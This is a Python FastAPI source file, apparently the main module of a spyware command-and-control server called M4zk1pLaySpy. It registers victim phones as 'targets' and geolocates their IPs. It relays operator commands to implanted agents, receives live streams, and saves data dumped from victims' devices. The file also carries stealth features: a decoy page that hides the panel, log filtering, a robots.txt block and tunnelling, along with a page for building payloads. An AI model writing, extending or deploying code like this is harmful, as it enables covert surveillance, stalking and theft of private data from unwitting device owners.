"""Entry point M4zk1pLaySpy C2."""
from __future__ import annotations

import asyncio
import base64
import hashlib
import json
import time
import uuid
from pathlib import Path
from typing import Any

from fastapi import FastAPI, Form, Request, WebSocket, WebSocketDisconnect
from fastapi.middleware.gzip import GZipMiddleware
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles

from . import (api_admin, api_build, api_control, api_dump, api_ios, api_pair,
               api_targets, config, db, ipgeo, security, stealth, tunnel)
from .ws import hub

VERSION = "2.1.0"

config.ensure_dirs()
db.init()
stealth.install_log_filter()

app = FastAPI(title="M4zk1pLaySpy", version=VERSION, docs_url="/api/docs",
              redoc_url=None, openapi_url="/api/openapi.json")

app.add_middleware(GZipMiddleware, minimum_size=700)
app.mount("/static", StaticFiles(directory=str(config.STATIC_DIR)), name="static")

app.include_router(api_targets.router)
app.include_router(api_control.router)
app.include_router(api_dump.router)
app.include_router(api_build.router)
app.include_router(api_admin.router)
app.include_router(api_ios.router)
app.include_router(api_pair.router)


@app.middleware("http")
async def stealth_mw(request: Request, call_next):
    response = await call_next(request)
    return await stealth.apply(request, response)


def page(name: str) -> HTMLResponse:
    f = config.WEB_DIR / name
    if not f.exists():
        return HTMLResponse("<h1>halaman belum ada</h1>", status_code=500)
    return HTMLResponse(f.read_text(encoding="utf-8"))


def logged(request: Request) -> bool:
    return security.valid_session(request.cookies.get(security.COOKIE))


@app.get("/", response_class=HTMLResponse)
async def root(request: Request):
    if logged(request):
        return RedirectResponse("/dashboard")
    if config.get("hide_panel"):
        return stealth.decoy()
    return page("login.html")


@app.get("/login", response_class=HTMLResponse)
async def login_page(request: Request):
    if logged(request):
        return RedirectResponse("/dashboard")
    return page("login.html")


@app.get("/robots.txt")
async def robots():
    return HTMLResponse("User-agent: *\nDisallow: /\n", media_type="text/plain")


@app.get("/403", response_class=HTMLResponse)
async def forbidden():
    return page("403.html")


@app.get("/dashboard", response_class=HTMLResponse)
async def dashboard():
    return page("dashboard.html")


@app.get("/targets", response_class=HTMLResponse)
async def targets_page():
    return page("targets.html")


@app.get("/pair", response_class=HTMLResponse)
async def pair_page():
    return page("pair.html")


@app.get("/build", response_class=HTMLResponse)
async def build_page():
    return page("build.html")


@app.get("/dumps", response_class=HTMLResponse)
async def dumps_page():
    return page("dumps.html")


@app.get("/admin", response_class=HTMLResponse)
async def admin_page():
    return page("admin.html")


@app.get("/agent", response_class=HTMLResponse)
async def agent_page():
    return page("agent.html")


@app.get("/favicon.ico")
async def favicon():
    return FileResponse(config.STATIC_DIR / "img" / "garuda.svg",
                        media_type="image/svg+xml")


@app.post("/api/login")
async def login(request: Request, license: str = Form(...)):
    ip = security.client_ip(request)
    if not security.rate_ok(ip):
        return JSONResponse({"ok": False, "message": "terlalu banyak percobaan"}, status_code=429)
    if not security.check_license(license):
        db.audit("login_gagal", ip)
        return JSONResponse({"ok": False, "message": "license ditolak"}, status_code=403)
    token = security.create_session(ip, request.headers.get("user-agent", ""))
    resp = JSONResponse({"ok": True, "redirect": "/dashboard"})
    resp.set_cookie(security.COOKIE, token, httponly=True, samesite="lax",
                    max_age=int(config.get("session_hours", 24)) * 3600)
    return resp


@app.post("/api/logout")
async def logout(request: Request):
    security.kill_session(request.cookies.get(security.COOKIE))
    resp = JSONResponse({"ok": True})
    resp.delete_cookie(security.COOKIE)
    return resp


@app.get("/api/session")
async def session(request: Request):
    return {"ok": logged(request),
            "license": bool(config.get("require_license", True)),
            "version": VERSION}


@app.get("/api/tunnel/status")
async def tunnel_status():
    return tunnel.status()


@app.post("/api/tunnel/start")
async def tunnel_start(body: dict | None = None):
    try:
        return await tunnel.start(str((body or {}).get("kind") or "auto"))
    except RuntimeError as exc:
        return JSONResponse({"ok": False, "message": str(exc)}, status_code=400)


@app.post("/api/tunnel/stop")
async def tunnel_stop():
    return await tunnel.stop()


@app.websocket("/ws/operator")
async def ws_operator(ws: WebSocket):
    if not security.valid_session(ws.cookies.get(security.COOKIE)):
        await ws.close(code=4401)
        return
    await ws.accept()
    await hub.add_operator(ws)
    try:
        while True:
            raw = await ws.receive_text()
            try:
                msg = json.loads(raw)
            except json.JSONDecodeError:
                continue
            if msg.get("t") == "ping":
                await ws.send_text(json.dumps({"t": "pong", "ts": time.time()}))
            elif msg.get("t") == "cmd":
                await hub.command(msg.get("target", ""), msg.get("type", ""),
                                  msg.get("args") or {})
    except WebSocketDisconnect:
        pass
    finally:
        await hub.drop_operator(ws)


@app.websocket("/ws/agent")
async def ws_agent(ws: WebSocket):
    await ws.accept()
    target_id = ""
    try:
        hello_raw = await asyncio.wait_for(ws.receive_text(), timeout=20)
        try:
            hello = json.loads(hello_raw)
        except json.JSONDecodeError:
            await ws.close(code=4400)
            return
        if hello.get("t") != "hello":
            await ws.close(code=4400)
            return

        token = str(hello.get("token") or "").strip() or uuid.uuid4().hex
        info: dict[str, Any] = hello.get("info") or {}
        ip = security.client_ip_from_ws(ws)
        existing = db.one("SELECT * FROM targets WHERE token=?", (token,))

        if existing is None:
            target_id = uuid.uuid4().hex[:10]
            geo = await ipgeo.lookup(ip)
            now = time.time()
            db.x(
                "INSERT INTO targets(id,token,label,brand,model,android,sdk,ip,isp,country,city,"
                "lat,lon,battery,charging,storage_free,first_seen,last_seen,source)"
                " VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,'apk')",
                (target_id, token, info.get("label") or info.get("model") or "Target",
                 info.get("brand", ""), info.get("model", ""), info.get("android", ""),
                 int(info.get("sdk") or 0), ip, geo.get("isp", ""), geo.get("country", ""),
                 geo.get("city", ""), geo.get("lat"), geo.get("lon"),
                 int(info.get("battery") or 0), 1 if info.get("charging") else 0,
                 int(info.get("storage_free") or 0), now, now),
            )
            db.audit("target_baru", f"{target_id} :: {info.get('model', '?')} :: {ip}")
        else:
            target_id = existing["id"]
            db.x(
                "UPDATE targets SET ip=?,brand=?,model=?,android=?,sdk=?,battery=?,"
                "charging=?,storage_free=?,last_seen=? WHERE id=?",
                (ip, info.get("brand", existing["brand"]), info.get("model", existing["model"]),
                 info.get("android", existing["android"]), int(info.get("sdk") or 0),
                 int(info.get("battery") or 0), 1 if info.get("charging") else 0,
                 int(info.get("storage_free") or 0), time.time(), target_id),
            )

        await ws.send_text(json.dumps({"t": "hello_ok", "id": target_id}))
        await hub.add_agent(target_id, ws)
        await hub.flush_queue(target_id)
        await hub.to_operators({"t": "targets_dirty"})

        while True:
            raw = await ws.receive_text()
            try:
                msg = json.loads(raw)
            except json.JSONDecodeError:
                continue
            kind = msg.get("t")
            if kind == "ping":
                await ws.send_text(json.dumps({"t": "pong"}))
            elif kind == "result":
                db.x(
                    "UPDATE commands SET status=?,result=?,updated=? WHERE id=?",
                    ("done" if msg.get("ok") else "error",
                     json.dumps(msg.get("data"))[:60000], time.time(), msg.get("id")),
                )
                await hub.to_operators({
                    "t": "result", "id": msg.get("id"), "target": target_id,
                    "ok": bool(msg.get("ok")), "data": msg.get("data")})
            elif kind == "stream":
                await hub.to_operators({
                    "t": "stream", "target": target_id, "kind": msg.get("kind"),
                    "b64": msg.get("b64"), "meta": msg.get("meta")})
            elif kind == "info":
                data = msg.get("data") or {}
                db.x("UPDATE targets SET battery=?,last_seen=? WHERE id=?",
                     (int(data.get("battery") or 0), time.time(), target_id))
                await hub.to_operators({"t": "info", "target": target_id, "data": data})
            elif kind == "dump":
                await _handle_dump(target_id, msg)
    except (WebSocketDisconnect, asyncio.TimeoutError):
        pass
    finally:
        if target_id:
            await hub.drop_agent(target_id, ws)
            await hub.to_operators({"t": "targets_dirty"})


async def _handle_dump(target_id: str, msg: dict[str, Any]) -> None:
    kind = str(msg.get("kind") or "lain")
    raw_name = Path(str(msg.get("name") or f"{kind}_{int(time.time())}.bin")).name
    name = raw_name.replace("/", "_").replace("\\", "_") or f"{kind}_{int(time.time())}.bin"
    try:
        blob = base64.b64decode(msg.get("b64") or "")
    except (ValueError, TypeError):
        return
    if not blob:
        return
    folder = config.DUMP_DIR / target_id
    folder.mkdir(parents=True, exist_ok=True)
    (folder / name).write_bytes(blob)
    dump_id = uuid.uuid4().hex[:12]
    db.x(
        "INSERT INTO dumps(id,target_id,kind,filename,size,sha256,created) VALUES(?,?,?,?,?,?,?)",
        (dump_id, target_id, kind, name, len(blob), hashlib.sha256(blob).hexdigest(), time.time()),
    )
    await hub.to_operators({"t": "dump", "target": target_id, "id": dump_id,
                            "kind": kind, "name": name, "size": len(blob)})
    db.audit("dump", f"{target_id} :: {kind} :: {name}")


async def _janitor() -> None:
    while True:
        await asyncio.sleep(20)
        try:
            db.x("UPDATE targets SET online=0 WHERE source='web' AND last_seen < ?",
                 (time.time() - 60,))
            db.x("DELETE FROM pairs WHERE expires < ?", (time.time() - 3600,))
            security.purge_sessions()
        except Exception:
            pass


@app.on_event("startup")
async def on_start() -> None:
    asyncio.create_task(_janitor())
    if config.get("tunnel_auto"):
        try:
            await tunnel.start("auto")
        except RuntimeError:
            pass


@app.get("/health")
async def health():
    return {"ok": True, "ts": time.time()}
